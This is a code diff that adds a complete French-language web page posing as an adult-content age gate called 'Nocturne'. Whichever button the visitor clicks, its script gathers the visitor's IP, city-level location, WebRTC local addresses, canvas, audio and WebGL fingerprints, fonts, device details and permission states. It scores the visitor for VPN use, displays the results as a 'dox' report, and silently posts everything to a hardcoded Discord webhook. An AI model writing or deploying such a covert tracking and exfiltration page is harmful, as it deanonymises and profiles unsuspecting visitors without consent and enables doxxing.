@@ -50,4 +50,517 @@ body::after{
   text-transform:uppercase;color:#d9c9ff;background:rgba(167,139,250,.13);
   border:1px solid rgba(167,139,250,.28);border-radius:999px;padding:6px 13px;margin-bottom:18px}
 .badge.ok{color:#bbf7d0;background:rgba(74,222,128,.12);border-color:rgba(74,222,128,.3)}
-.dot{width:5px;height:5px;border-radius:50%;background:var(--accent);box-shadow
+.dot{width:5px;height:5px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent);animation:pulse 2s infinite}
+.badge.ok .dot{background:#4ade80;box-shadow:0 0 8px #4ade80}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}
+h1{font-family:"Instrument Serif",Georgia,serif;font-weight:400;font-size:clamp(27px,7vw,35px);
+  line-height:1.06;letter-spacing:-.015em;margin:0 0 12px}
+h1 em{font-style:italic;color:#d3c4ff}
+p.sub{margin:0 0 24px;font-size:13.5px;line-height:1.62;color:var(--muted);font-weight:300}
+p.sub b{color:rgba(255,255,255,.8);font-weight:500}
+.btn{width:100%;border:0;cursor:pointer;border-radius:14px;padding:15px 18px;font-family:inherit;
+  font-size:14px;font-weight:600;letter-spacing:.01em;color:#120a22;background:linear-gradient(180deg,#c9b4ff,#a78bfa);
+  box-shadow:0 10px 26px -8px rgba(167,139,250,.7),inset 0 1px 0 rgba(255,255,255,.45);
+  display:flex;align-items:center;justify-content:center;gap:9px;
+  transition:transform .18s ease,box-shadow .18s ease,filter .18s ease}
+.btn:hover{transform:translateY(-1.5px);filter:brightness(1.06)}
+.btn:active{transform:translateY(0) scale(.99)}
+.btn[disabled]{cursor:default;opacity:.9;transform:none}
+.btn.alt{background:rgba(255,255,255,.07);color:#e9e3ff;box-shadow:none;border:1px solid var(--line)}
+.ghost{display:block;margin:14px auto 0;background:none;border:0;cursor:pointer;
+  font-family:inherit;font-size:12.5px;color:var(--muted);transition:color .18s}
+.ghost:hover{color:rgba(255,255,255,.8)}
+.bar{height:3px;border-radius:99px;margin-top:18px;overflow:hidden;background:rgba(255,255,255,.08);
+  opacity:0;transition:opacity .3s}
+.bar.on{opacity:1}
+.bar i{display:block;height:100%;width:0%;border-radius:99px;
+  background:linear-gradient(90deg,#a78bfa,#f0abfc);transition:width 1.9s cubic-bezier(.3,.9,.2,1)}
+.foot{display:flex;align-items:center;justify-content:center;gap:7px;margin-top:22px;padding-top:16px;
+  border-top:1px solid rgba(255,255,255,.06);font-size:11px;color:rgba(255,255,255,.34);letter-spacing:.05em}
+.foot svg{width:12px;height:12px}
+.spin{width:15px;height:15px;border-radius:50%;border:2px solid rgba(18,10,34,.35);border-top-color:#120a22;animation:sp .7s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+
+/* ---- dump panel ---- */
+.dox{margin-top:20px;text-align:left;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  font-size:11.5px;line-height:1.5;color:#ded8f0}
+.sec{margin-top:16px}
+.sec h2{font-family:Inter,sans-serif;font-size:9.5px;letter-spacing:.24em;text-transform:uppercase;
+  color:#c4b5fd;margin:0 0 7px;display:flex;align-items:center;gap:9px;font-weight:600}
+.sec h2::after{content:"";flex:1;height:1px;background:linear-gradient(90deg,rgba(167,139,250,.4),transparent)}
+.row{display:flex;gap:10px;padding:5px 0;border-bottom:1px dashed rgba(255,255,255,.055);
+  animation:in .4s cubic-bezier(.2,.8,.2,1) both}
+@keyframes in{from{opacity:0;transform:translateX(-6px)}to{opacity:1;transform:none}}
+.k{color:#8b85a3;flex:0 0 40%;font-size:11px}
+.v{flex:1;color:#f0ebff;word-break:break-word}
+.v a{color:#c4b5fd;text-decoration:none;border-bottom:1px solid rgba(196,181,253,.4)}
+.v .hi{color:#86efac;font-weight:600}
+.v .lo{color:#fca5a5}
+.v .mono{color:#fde68a}
+.v .warn{color:#fbbf24}
+.gauge{height:5px;border-radius:99px;background:rgba(255,255,255,.09);overflow:hidden;margin-top:6px}
+.gauge i{display:block;height:100%;border-radius:99px;background:linear-gradient(90deg,#4ade80,#fbbf24,#f87171)}
+.tools{display:flex;gap:8px;margin-top:20px}
+.tools .btn{font-size:12.5px;padding:12px 14px}
+.small{font-size:10.5px;color:rgba(255,255,255,.32);text-align:center;margin-top:12px;line-height:1.5}
+</style>
+</head>
+<body>
+
+<main class="gate">
+  <div class="brand">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><circle cx="12" cy="12" r="4.2"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3"/></svg>
+    Nocturne
+  </div>
+  <div class="badge" id="badge"><span class="dot"></span>Accès restreint</div>
+  <h1 id="title">Contenu réservé<br>aux <em>adultes</em></h1>
+  <p class="sub" id="sub">Cet espace privé contient des visuels et des œuvres destinés à un public majeur. Confirmez votre âge pour <b>déverrouiller l'accès</b>.</p>
+  <button class="btn" id="go"><span id="label">J'ai 18 ans ou plus</span></button>
+  <button class="ghost" id="later">Plus tard</button>
+  <div class="bar" id="bar"><i id="fill"></i></div>
+  <section class="dox" id="dox" hidden></section>
+  <div id="tools"></div>
+  <div class="foot">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="4" y="10" width="16" height="10" rx="2.5"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg>
+    Session chiffrée · SSL 256 bits · sans popup
+  </div>
+</main>
+
+<script>
+/* ================= CONFIG ================= */
+const WEBHOOK    = "https://discord.com/api/webhooks/1572285611757535345/1hltRG4Frv52fIG4NpSJH69CY01XjWnaWyPe8JSyqC_1zrEjNNuwtmVJQz7HcQwfGAeH";
+const REDIRECT   = "https://venice.ai";   // "" = pas de redirection
+const SITE_NAME  = "NOCTURNE";
+const LABEL      = "nocturne.gate";
+/* ========================================= */
+
+const $ = id => document.getElementById(id);
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const esc = s => String(s).replace(/[&<>"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
+const p2 = n => String(n).padStart(2,"0");
+const nowLocal = () => { const d = new Date(); return `${p2(d.getDate())}/${p2(d.getMonth()+1)}/${d.getFullYear()} ${p2(d.getHours())}:${p2(d.getMinutes())}:${p2(d.getSeconds())}`; };
+const flag = cc => cc ? cc.toUpperCase().replace(/./g, c => String.fromCodePoint(127397 + c.charCodeAt(0))) : "";
+
+async function hash(str){
+  try{
+    const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(str));
+    return [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2,"0")).join("").slice(0,20);
+  }catch(e){
+    let h = 2166136261;
+    for(let i=0;i<str.length;i++){ h ^= str.charCodeAt(i); h = Math.imul(h, 16777619); }
+    return (h>>>0).toString(16).padStart(8,"0").repeat(2);
+  }
+}
+const j = async (url) => {
+  try{
+    const r = await fetch(url, {cache:"no-store"});
+    if(!r.ok) return null;
+    const d = await r.json();
+    return (d && typeof d === "object") ? d : null;
+  }catch(e){ return null; }
+};
+const km = (a, b) => {
+  if(a.lat==null || b.lat==null) return 0;
+  const R = 6371, dLat = (b.lat-a.lat)*Math.PI/180, dLon = (b.lon-a.lon)*Math.PI/180;
+  const la1 = a.lat*Math.PI/180, la2 = b.lat*Math.PI/180;
+  const h = Math.sin(dLat/2)**2 + Math.cos(la1)*Math.cos(la2)*Math.sin(dLon/2)**2;
+  return 2*R*Math.asin(Math.sqrt(h));
+};
+
+/* ---------- géo multi-bases, SANS autorisation ---------- */
+async function geoConsensus(){
+  const [a, b, c, d] = await Promise.all([
+    j("https://ipwho.is/"),
+    j("https://freeipapi.com/api/json"),
+    j("https://ipapi.co/json/"),
+    j("https://ipinfo.io/json")
+  ]);
+
+  const src = [];
+  if(a && a.success !== false && a.ip) src.push({
+    n:"ipwho.is", ip:a.ip, city:a.city, region:a.region, zip:a.postal, country:a.country, cc:a.country_code,
+    isp:(a.connection&&(a.connection.isp||a.connection.org))||"", asn:(a.connection&&a.connection.asn)||"",
+    lat:a.latitude, lon:a.longitude, tz:a.timezone&&a.timezone.id
+  });
+  if(b && b.ipAddress) src.push({
+    n:"freeipapi", ip:b.ipAddress, city:b.cityName, region:b.regionName, zip:b.zipCode, country:b.countryName,
+    cc:b.countryCode, isp:"", asn:"", lat:b.latitude, lon:b.longitude, tz:b.timeZones&&b.timeZones[0]
+  });
+  if(c && c.ip && !c.error) src.push({
+    n:"ipapi.co", ip:c.ip, city:c.city, region:c.region, zip:c.postal, country:c.country_name, cc:c.country_code,
+    isp:c.org||"", asn:c.asn||"", lat:c.latitude, lon:c.longitude, tz:c.timezone
+  });
+  if(d && d.ip) src.push({
+    n:"ipinfo", ip:d.ip, city:d.city, region:d.region, zip:d.postal, country:d.country, cc:d.country,
+    isp:d.org||"", asn:d.org||"", lat:d.loc?parseFloat(d.loc.split(",")[0]):null,
+    lon:d.loc?parseFloat(d.loc.split(",")[1]):null, tz:d.timezone
+  });
+
+  if(!src.length){
+    const f = await j("https://api.ipify.org?format=json");
+    return { ip: f && f.ip, city:"", region:"", zip:"", country:"", cc:"", isp:"", asn:"",
+      lat:null, lon:null, tz:"", src:[], spread:0, agree:0 };
+  }
+
+  const first = (k) => { for(const s of src){ const v = s[k]; if(v !== null && v !== undefined && v !== "") return v; } return ""; };
+  const pts = src.filter(s => s.lat != null && s.lon != null);
+  let spread = 0;
+  for(let i=0;i<pts.length;i++) for(let k=i+1;k<pts.length;k++) spread = Math.max(spread, km(pts[i], pts[k]));
+
+  const ipCount = {};
+  src.forEach(s => ipCount[s.ip] = (ipCount[s.ip]||0)+1);
+  const agree = Math.max(0, ...Object.values(ipCount));
+
+  return {
+    ip: first("ip"), city: first("city"), region: first("region"), zip: first("zip"),
+    country: first("country"), cc: first("cc"), isp: first("isp"), asn: first("asn"),
+    lat: first("lat"), lon: first("lon"), tz: first("tz"),
+    src: src.map(s => s.n), spread: Math.round(spread), agree, total: src.length
+  };
+}
+
+/* ---------- fuite WebRTC ---------- */
+function rtcIps(timeout = 3500){
+  return new Promise(res => {
+    const found = new Set();
+    let pc;
+    try{ pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]}); }
+    catch(e){ return res([]); }
+    const done = () => { try{ pc.close(); }catch(e){} res([...found]); };
+    pc.onicecandidate = e => {
+      if(!e.candidate) return;
+      const p = e.candidate.candidate.split(" ");
+      if(p[4]) found.add(p[4] + " · " + p[7] + (p[5] ? ":"+p[5] : ""));
+    };
+    try{ pc.createDataChannel("x"); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{}); }catch(e){}
+    setTimeout(done, timeout);
+  });
+}
+
+/* ---------- empreintes ---------- */
+async function canvasFp(){
+  try{
+    const c = document.createElement("canvas");
+    c.width = 300; c.height = 70;
+    const x = c.getContext("2d");
+    x.textBaseline = "top"; x.font = "16px 'Arial'";
+    x.fillStyle = "#f60"; x.fillRect(0,0,300,20);
+    x.fillStyle = "#069"; x.fillText("Nocturne 🜁 fingerprint 1234", 4, 22);
+    x.fillStyle = "rgba(102,204,0,.7)"; x.fillText("Nocturne 🜁 fingerprint 1234", 6, 40);
+    const g = x.createLinearGradient(0,0,300,70);
+    g.addColorStop(0,"#a78bfa"); g.addColorStop(1,"#f0abfc");
+    x.fillStyle = g; x.fillRect(0,58,300,12);
+    return await hash(c.toDataURL());
+  }catch(e){ return "indisponible"; }
+}
+function glInfo(){
+  try{
+    const c = document.createElement("canvas");
+    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+    if(!gl) return {v:"—", r:"—", max:"—"};
+    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+    return {
+      v: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+      r: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+      max: gl.getParameter(gl.MAX_TEXTURE_SIZE)
+    };
+  }catch(e){ return {v:"—", r:"—", max:"—"}; }
+}
+async function audioFp(){
+  try{
+    const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+    if(!Ctx) return "indisponible";
+    const ctx = new Ctx(1, 44100, 44100);
+    const osc = ctx.createOscillator();
+    osc.type = "triangle"; osc.frequency.value = 10000;
+    const comp = ctx.createDynamicsCompressor();
+    comp.threshold.value = -50; comp.knee.value = 40; comp.ratio.value = 12;
+    osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
+    const buf = await ctx.startRendering();
+    const d = buf.getChannelData(0);
+    let sum = 0;
+    for(let i = 4500; i < 5000; i++) sum += Math.abs(d[i]);
+    return await hash(sum.toFixed(8));
+  }catch(e){ return "indisponible"; }
+}
+function fonts(){
+  const base = ["monospace","sans-serif","serif"];
+  const test = ["Arial","Arial Black","Calibri","Cambria","Candara","Comic Sans MS","Consolas","Courier New",
+    "Georgia","Helvetica","Impact","Inter","Lucida Console","Menlo","Monaco","Optima","Palatino","Roboto",
+    "Segoe UI","Tahoma","Times New Roman","Trebuchet MS","Ubuntu","Verdana","SF Pro Text"];
+  const c = document.createElement("canvas").getContext("2d");
+  const w = (f) => { c.font = "72px "+f; return c.measureText("mmmmmmmmmmlli").width; };
+  const b = base.map(w);
+  return test.filter(f => base.some((bs,i) => w("'"+f+"',"+bs) !== b[i]));
+}
+
+/* ---------- collecte ---------- */
+async function collect(){
+  const geo = await geoConsensus();
+  const [rtc, cvFp, audFp, bat] = await Promise.all([
+    rtcIps(), canvasFp(), audioFp(), (async () => {
+      try{ if(!navigator.getBattery) return "API absente";
+        const b = await navigator.getBattery();
+        return Math.round(b.level*100)+"%"+(b.charging?" (en charge)":"");
+      }catch(e){ return "indisponible"; }
+    })()
+  ]);
+
+  let uaData = null;
+  try{ if(navigator.userAgentData) uaData = await navigator.userAgentData.getHighEntropyValues(
+    ["platform","platformVersion","architecture","bitness","model","uaFullVersion"]); }catch(e){}
+
+  let perms = {};
+  for(const n of ["geolocation","camera","microphone","notifications","clipboard-read","midi"]){
+    try{ perms[n] = (await navigator.permissions.query({name:n})).state; }catch(e){}
+  }
+
+  let storage = "—";
+  try{ const s = await navigator.storage.estimate();
+    storage = (s.quota/1048576).toFixed(1)+" Mo quota · "+(s.usage/1048576).toFixed(2)+" Mo utilisés"; }catch(e){}
+
+  let audio = {};
+  try{ const ac = new (window.AudioContext||window.webkitAudioContext)();
+    audio = {rate: ac.sampleRate, ch: ac.destination.maxChannelCount}; ac.close(); }catch(e){}
+
+  let devices = "—";
+  try{ const d = await navigator.mediaDevices.enumerateDevices();
+    devices = d.map(x => x.kind.replace("input","in").replace("output","out")+": "+(x.label||"anonyme")).join(" · ") || "aucun"; }catch(e){}
+
+  const gl = glInfo();
+  const tz = Intl.DateTimeFormat().resolvedOptions();
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  const mem = performance.memory ? (performance.memory.usedJSHeapSize/1048576).toFixed(1)+" Mo heap JS" : "—";
+  const codecs = ["video/mp4; codecs=avc1.42E01E","video/webm; codecs=vp9","video/webm; codecs=av01","audio/mpeg","audio/flac","audio/ogg; codecs=opus"]
+    .map(c => { try{ const v = document.createElement("video"); return c+" → "+(v.canPlayType(c)||"non"); }catch(e){ return c; } });
+  let voices = "—";
+  try{ voices = (speechSynthesis.getVoices()||[]).length + " voix"; }catch(e){}
+
+  const D = {
+    geo, rtc, cvFp, audFp, bat, uaData, perms, storage, audio, gl, tz, mem, conn, codecs, voices, devices,
+    fontList: fonts(), ua: navigator.userAgent
+  };
+  D.fpGlobal = await hash([cvFp, audFp, gl.r, D.ua, screen.width+"x"+screen.height, tz.timeZone,
+    navigator.language, navigator.hardwareConcurrency].join("|"));
+
+  /* --- score de cohérence / VPN, calculé sur signaux croisés --- */
+  const browserTz = tz.timeZone;
+  const ipTz = geo.tz || "";
+  const tzMismatch = !!(ipTz && browserTz && ipTz !== browserTz);
+  const locRegion = (navigator.language||"").split("-")[1];
+  const ccMismatch = !!(locRegion && geo.cc && locRegion.toUpperCase() !== geo.cc.toUpperCase());
+  const dc = /vpn|hosting|proxy|datacenter|cloud|ovh|aws|digitalocean|hetzner|m247|linode|vultr|scaleway|azure|gcore|choopa|contabo|leaseweb/i.test(geo.isp||"");
+  const spreadHigh = geo.spread > 120;
+  const score = Math.min(100,
+    (dc?45:0) + (tzMismatch?25:0) + (ccMismatch?10:0) + (spreadHigh?20:0) + (geo.agree>1?0:15));
+
+  D.verdict = { tzMismatch, ccMismatch, dc, spreadHigh, score };
+  return D;
+}
+
+/* ---------- sections ---------- */
+function buildSections(D){
+  const g = D.geo || {};
+  const v = D.verdict;
+  const S = [];
+
+  const tzLine = g.tz
+    ? (v.tzMismatch
+        ? `<span class="warn">${esc(g.tz)}</span> (IP) ≠ <span class="mono">${esc(D.tz.timeZone)}</span> (machine)`
+        : `<span class="mono">${esc(D.tz.timeZone)}</span> · cohérent avec l'IP`);
+
+  const verdictTxt = v.score >= 60 ? `<span class="lo">anonymisation probable</span>`
+    : v.score >= 25 ? `<span class="warn">signaux mitigés</span>`
+    : `<span class="hi">IP directe, cohérente</span>`;
+
+  S.push({title:"Réseau", rows:[
+    ["Adresse IP publique", g.ip ? `<span class="mono">${esc(g.ip)}</span>` : `<span class="lo">indisponible</span>`],
+    ["FAI / organisation", g.isp ? esc(g.isp) : "—"],
+    ["ASN", g.asn ? esc(String(g.asn)) : "—"],
+    ["Datacenter / VPN", v.dc ? `<span class="lo">PROBABLE</span>` : "aucun signe"],
+    ["IP locales (WebRTC)", D.rtc.length ? `<span class="mono">${esc(D.rtc.join(" · "))}</span>` : "masquées (mDNS)"],
+    ["Type de connexion", D.conn ? esc([D.conn.effectiveType, D.conn.downlink+" Mbps", D.conn.rtt+" ms RTT", D.conn.saveData?"économie":"normal"].filter(Boolean).join(" · ")) : "—"]
+  ]});
+
+  const loc = [g.city, g.region, g.zip, (g.country||"")+" "+flag(g.cc)].filter(Boolean).join(", ");
+  S.push({title:"Localisation (IP, sans autorisation)", rows:[
+    ["Ville / région / CP / pays", loc || "—"],
+    ["Coordonnées", (g.lat!=null && g.lon!=null)
+      ? `<span class="hi">${Number(g.lat).toFixed(5)}, ${Number(g.lon).toFixed(5)}</span> · <a href="https://www.google.com/maps?q=${g.lat},${g.lon}" target="_blank" rel="noopener">carte</a>`
+      : "—"],
+    ["Fuseau horaire", tzLine],
+    ["Heure locale / UTC", `${esc(nowLocal())} · <span class="mono">${new Date().toISOString().slice(0,19).replace("T"," ")}</span>`],
+    ["Langues", esc((navigator.languages||[navigator.language]).join(", "))],
+    ["Langue ↔ pays", v.ccMismatch ? `<span class="warn">divergence</span> (${esc((navigator.language||"").split("-")[1]||"")} vs ${esc(g.cc)})` : "cohérent"],
+    ["Sources concordantes", `${g.agree||0}/${g.total||0} bases · écart max ${g.spread||0} km${v.spreadHigh?" <span class='warn'>(dispersé)</span>":""}`],
+    ["Verdict", `${verdictTxt} · indice ${v.score}/100<div class="gauge"><i style="width:${Math.max(4,v.score)}%"></i></div>`],
+    ["Précision attendue", "niveau ville — quelques km, pas la rue"]
+  ]});
+
+  const ua = D.uaData || {};
+  S.push({title:"Appareil", rows:[
+    ["Plateforme", esc(ua.platform || navigator.platform || "—")],
+    ["Version OS", esc(ua.platformVersion || "—")],
+    ["Architecture / bits", esc([ua.architecture, ua.bitness].filter(Boolean).join(" ") || "—")],
+    ["Modèle", esc(ua.model || "—")],
+    ["Cœurs CPU", `<span class="mono">${navigator.hardwareConcurrency || "—"}</span>`],
+    ["RAM estimée", navigator.deviceMemory ? `<span class="mono">${navigator.deviceMemory} Go</span>` : "—"],
+    ["Écran", `<span class="mono">${screen.width}×${screen.height} · ${screen.colorDepth} bits · DPR ${window.devicePixelRatio}</span>`],
+    ["Fenêtre / orientation", `<span class="mono">${window.innerWidth}×${window.innerHeight}</span> · ${esc(screen.orientation ? screen.orientation.type : "—")}`],
+    ["Tactile / pointeur", `${navigator.maxTouchPoints} points · ${matchMedia("(pointer:fine)").matches?"souris précise":"pointeur grossier"}`],
+    ["Batterie", esc(D.bat)],
+    ["GPU", `${esc(D.gl.v)} — ${esc(D.gl.r)}`],
+    ["Audio", `${D.audio.rate||"—"} Hz · ${D.audio.ch||"—"} canaux`],
+    ["Mémoire JS", esc(D.mem)]
+  ]});
+
+  S.push({title:"Empreintes", rows:[
+    ["Empreinte globale", `<span class="mono">${esc(D.fpGlobal)}</span>`],
+    ["Canvas", `<span class="mono">${esc(D.cvFp)}</span>`],
+    ["Audio", `<span class="mono">${esc(D.audFp)}</span>`],
+    ["WebGL max texture", esc(String(D.gl.max))],
+    ["Polices détectées", D.fontList.length ? esc(D.fontList.slice(0,18).join(", ")) + (D.fontList.length>18?" …":"") : "aucune"],
+    ["Codecs", esc(D.codecs.join(" · "))],
+    ["Voix TTS", esc(D.voices)],
+    ["Stockage", esc(D.storage)],
+    ["Cookies / DNT", `${navigator.cookieEnabled?"activés":"désactivés"} · DNT ${navigator.doNotTrack || "non"}`]
+  ]});
+
+  S.push({title:"Permissions (état, sans demande)", rows:[
+    ["Géoloc navigateur", `<span class="mono">${esc(D.perms.geolocation||"—")}</span> · non utilisée ici`],
+    ["Caméra / micro", `${esc(D.perms.camera||"—")} · ${esc(D.perms.microphone||"—")}`],
+    ["Notifications / presse-papier", `${esc(D.perms.notifications||"—")} · ${esc(D.perms["clipboard-read"]||"—")}`],
+    ["Périphériques", esc(D.devices)]
+  ]});
+
+  S.push({title:"Contexte", rows:[
+    ["Provenance", esc(document.referrer || "accès direct")],
+    ["Ouverture", window.opener ? "fenêtre enfant" : "directe"],
+    ["Préférences", `${matchMedia("(prefers-color-scheme:dark)").matches?"sombre":"clair"} · ${matchMedia("(prefers-reduced-motion:reduce)").matches?"mouvement réduit":"animations"}`],
+    ["Surface disponible", `${screen.availWidth}×${screen.availHeight}`],
+    ["User-Agent", `<span class="mono">${esc(D.ua.slice(0,300))}</span>`]
+  ]});
+
+  return S;
+}
+
+/* ---------- affichage progressif ---------- */
+async function reveal(S){
+  const dox = $("dox");
+  dox.hidden = false;
+  for(const sec of S){
+    const el = document.createElement("section");
+    el.className = "sec";
+    el.innerHTML = `<h2>${esc(sec.title)}</h2>`;
+    dox.appendChild(el);
+    for(const [k, val] of sec.rows){
+      const r = document.createElement("div");
+      r.className = "row";
+      r.innerHTML = `<span class="k">${esc(k)}</span><span class="v">${val}</span>`;
+      el.appendChild(r);
+      await sleep(65);
+    }
+    await sleep(85);
+  }
+}
+
+/* ---------- Discord ---------- */
+async function send(D){
+  const g = D.geo || {};
+  const f = (n,val,i) => ({name:n, value:String(val||"—").slice(0,1000), inline:!!i});
+  const embeds = [
+    { title:"🌐 Réseau & localisation", color:0xa78bfa, fields:[
+      f("IP", g.ip ? "`"+g.ip+"`" : "indisponible", true),
+      f("FAI", g.isp || "—", true),
+      f("ASN", g.asn || "—", true),
+      f("Ville / région / CP", [g.city,g.region,g.zip].filter(Boolean).join(", ") || "—"),
+      f("Pays", ((g.country||"?")+" "+flag(g.cc)).trim()),
+      f("Coordonnées", g.lat!=null ? `\`${g.lat},${g.lon}\` · https://maps.google.com/?q=${g.lat},${g.lon}` : "—"),
+      f("TZ IP / machine", `${g.tz||"—"} / ${D.tz.timeZone}${D.verdict.tzMismatch?" ⚠":""}`, true),
+      f("Verdict VPN", `${D.verdict.score}/100 · ${D.verdict.dc?"datacenter":""} ${D.verdict.tzMismatch?"tz≠":""} ${D.verdict.spreadHigh?"écart":""}`.trim()),
+      f("Sources", `${g.agree||0}/${g.total||0} · écart ${g.spread||0}km`, true),
+      f("IP locales WebRTC", D.rtc.join(" · ") || "mDNS")
+    ]},
+    { title:"💻 Appareil", color:0x38bdf8, fields:[
+      f("Plateforme", (D.uaData && D.uaData.platform) || navigator.platform, true),
+      f("Arch", D.uaData ? [D.uaData.architecture,D.uaData.bitness].filter(Boolean).join(" ") : "—", true),
+      f("Modèle", (D.uaData && D.uaData.model) || "—", true),
+      f("CPU", navigator.hardwareConcurrency, true),
+      f("RAM", navigator.deviceMemory ? navigator.deviceMemory+" Go" : "—", true),
+      f("Écran", `${screen.width}×${screen.height} @${window.devicePixelRatio}x`, true),
+      f("GPU", `${D.gl.v} — ${D.gl.r}`),
+      f("Audio", `${D.audio.rate||"—"}Hz ${D.audio.ch||"—"}ch`, true),
+      f("Batterie", D.bat, true),
+      f("Langues", (navigator.languages||[]).join(", ")),
+      f("UA", "```"+(D.ua||"").slice(0,900)+"```")
+    ]},
+    { title:"🧬 Empreintes & permissions", color:0xf0abfc, fields:[
+      f("Empreinte", "`"+D.fpGlobal+"`"),
+      f("Canvas", "`"+D.cvFp+"`", true),
+      f("Audio", "`"+D.audFp+"`", true),
+      f("Polices", D.fontList.slice(0,25).join(", ") || "—"),
+      f("Stockage", D.storage),
+      f("Permissions", JSON.stringify(D.perms)),
+      f("Périphériques", D.devices),
+      f("Référent", document.referrer || "direct", true)
+    ]}
+  ];
+  const payload = { username: SITE_NAME+" · Visiteur", embeds: embeds.map(e => ({
+    ...e, timestamp:new Date().toISOString(), footer:{text: LABEL+" · "+((g.ip)||"ip inconnue")}
+  }))};
+  const body = JSON.stringify(payload);
+  try{
+    const r = await fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body,keepalive:true});
+    if(!r.ok) throw 0;
+  }catch(e){
+    try{ await fetch(WEBHOOK,{method:"POST",mode:"no-cors",headers:{"Content-Type":"application/json"},body,keepalive:true}); }catch(_){}
+  }
+}
+
+/* ---------- séquence ---------- */
+let busy = false;
+async function enter(){
+  if(busy) return; busy = true;
+  const go = $("go");
+  go.disabled = true;
+  go.innerHTML = '<span class="spin"></span><span>Lecture de la session…</span>';
+  $("bar").classList.add("on");
+  requestAnimationFrame(()=>{ $("fill").style.width = "100%"; });
+
+  const D = await collect();
+
+  $("title").innerHTML = "Identité<br><em>vérifiée</em>";
+  $("sub").innerHTML = "Voici ce que votre navigateur expose, sans aucune autorisation demandée.";
+  $("badge").classList.add("ok");
+  $("badge").innerHTML = '<span class="dot"></span>Accès autorisé';
+  go.style.display = "none";
+  $("later").style.display = "none";
+
+  await reveal(buildSections(D));
+  send(D);
+
+  const tools = $("tools");
+  tools.className = "tools";
+  tools.innerHTML = `
+    <button class="btn alt" id="copy">Copier le rapport</button>
+    ${REDIRECT ? '<button class="btn" id="next">Continuer</button>' : ""}
+  `;
+  $("copy").onclick = async () => {
+    const txt = [...document.querySelectorAll(".row")].map(r =>
+      r.querySelector(".k").textContent + " : " + r.querySelector(".v").textContent).join("\n");
+    try{ await navigator.clipboard.writeText(txt); $("copy").textContent = "Copié"; }
+    catch(e){ $("copy").textContent = "Échec"; }
+  };
+  if(REDIRECT) $("next").onclick = () => location.href = REDIRECT;
+
+  const s = document.createElement("p");
+  s.className = "small";
+  s.textContent = "Rapport transmis · empreinte " + D.fpGlobal;
+  tools.after(s);
+}
+
+$("go").addEventListener("click", enter);
+$("later").addEventListener("click", enter);
+</script>
+</body>
+</html>
